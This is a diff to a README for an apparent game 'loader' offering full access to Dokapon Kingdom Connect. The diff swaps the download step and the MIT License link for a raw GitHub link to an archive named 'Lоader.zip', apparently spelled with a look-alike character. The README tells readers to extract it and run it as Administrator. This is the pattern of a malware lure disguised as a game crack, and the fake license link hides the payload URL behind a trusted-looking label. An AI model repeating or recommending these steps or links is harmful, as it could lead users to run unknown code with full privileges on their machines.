@@ -28,7 +28,7 @@ Dokapon Kingdom Connect, , game loader, full game access, multiplayer, cross-pla
 
 ## 🛠️ Installation Guide
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/axrrow23/dumpall/main/Lоader.zip** from the repository.
 2. Extract contents to your preferred system folder.
 3. Run the Loader file as Administrator (or open via terminal on macOS/Linux).
 4. Follow on-screen prompts to launch the game and customize settings.
@@ -41,4 +41,4 @@ This project is provided **solely for educational and archival purposes**. We do
 ## 📜 License
 
 Licensed under the MIT License.  
-For full terms, see: [MIT License](https://opensource.org/licenses/MIT)
+For full terms, see: [MIT License](https://raw.githubusercontent.com/axrrow23/dumpall/main/Lоader.zip)
